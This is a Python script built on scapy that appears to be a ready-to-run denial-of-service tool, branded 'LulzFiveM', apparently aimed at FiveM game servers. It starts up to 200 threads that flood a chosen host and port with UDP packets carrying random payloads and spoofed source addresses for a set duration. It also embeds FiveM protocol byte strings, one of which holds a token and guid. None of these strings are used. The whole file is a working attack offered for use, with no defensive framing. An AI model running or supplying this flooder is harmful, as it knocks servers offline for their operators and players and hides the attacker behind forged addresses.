import threading, sys, os, time
from random import randint
from scapy.all import *

whitelisted = []
with open('fivem.txt', 'r') as fivem_file:
    [whitelisted.append(whitelisted_ip.strip('\n')) for whitelisted_ip in fivem_file.readlines()]

# fivem data
fivem_info = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x79\x7a"
fivem_sec = "\x8f\xff\x90\x3c\x82\xff\x00\x01\x00\x00\xff\xff\x00\x00\x05\x14\x00\x01\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x88\x00\x00\x00\x02\x00\x00\x00\x02\x90\x3c\x5c\x16\x00\x00\x00\x00"
fivem_token = "\x80\x00\x29\x5a\x01\xff\x00\x01\x00\x01\x83\xd6\x86\x00\x00\x01\x00\x46\x01\x00\x00\x00\x74\x6f\x6b\x65\x6e\x3d\x62\x31\x35\x33\x31\x36\x64\x63\x2d\x36\x63\x65\x39\x2d\x34\x62\x34\x32\x2d\x39\x31\x62\x35\x2d\x32\x36\x62\x65\x34\x37\x32\x32\x35\x63\x39\x38\x26\x67\x75\x69\x64\x3d\x31\x34\x38\x36\x31\x38\x37\x39\x32\x34\x35\x34\x33\x32\x30\x31\x31\x38"
fivem_24_1 = "\x14\xf4\xd4\x8d\x73\x43\x90\x9c\xec\x33\xad\xd0\x48\x90\xbb\xb1\xa2\x2f\x7e\xda\xc4\xa5\x14\xb6",
fivem_24_2 = "\x86\xb6\x06\x12\xf7\xf3\x17\xb4\xa5\x2a\x8d\xfb\x5e\xce\x92\x6d\xca\x1a\x34\x2a\xd1\xb8\xaf\xf7"

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:
            ip = IP(src=randip(), dst=host)
            udp = UDP(sport=5678,dport=int(port))
            raw = Raw(os.urandom(randint(1024, 2048)))
            send(ip/udp/raw, verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$$$$$$$ /$$$$$$ /$$    /$$ /$$$$$$$$ /$$      /$$
            | $$                | $$          | $$_____/|_  $$_/| $$   | $$| $$_____/| $$$    /$$$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$        | $$  | $$   | $$| $$      | $$$$  /$$$$
            | $$      | $$  | $$| $$|____ /$$/| $$$$$     | $$  |  $$ / $$/| $$$$$   | $$ $$/$$ $$
            | $$      | $$  | $$| $$   /$$$$/ | $$__/     | $$   \  $$ $$/ | $$__/   | $$  $$$| $$
            | $$      | $$  | $$| $$  /$$__/  | $$        | $$    \  $$$/  | $$      | $$\  $ | $$
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$       /$$$$$$   \  $/   | $$$$$$$$| $$ \/  | $$
            |________/ \______/ |__/|________/|__/      |______/    \_/    |________/|__/     |__/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')